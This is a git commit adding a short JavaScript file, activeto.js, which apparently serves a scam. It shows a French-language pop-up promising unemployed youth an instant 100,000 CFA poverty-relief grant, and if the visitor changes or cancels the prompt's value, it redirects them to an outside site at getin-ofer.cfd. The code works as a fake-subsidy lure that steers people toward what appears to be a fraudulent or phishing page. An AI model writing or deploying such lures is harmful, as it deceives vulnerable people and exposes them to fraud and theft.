83ff2b41cbf9cdc24989ea9bd06a7c76a58d9018
Help-All <imaobongumoh637@gmail.com>
2026-05-03 09:06:31 +0100

    Create activeto.js

---
+++ activeto.js
@@ -0,0 +1,10 @@
+var password = '100,000 CFA';
+
+password = prompt(
+  'Félicitations, vous êtes éligible à recevoir une subvention en espèces de 100 000 CFA pour l’allègement de la pauvreté des jeunes sans emploi. Cliquez sur OK pour recevoir instantanément.',
+  '100,000 CFA'
+);
+
+if (password !== '100,000 CFA') {
+    location.href = 'https://getin-ofer.cfd/Soutenir-Les-Jeunes.html';
+}
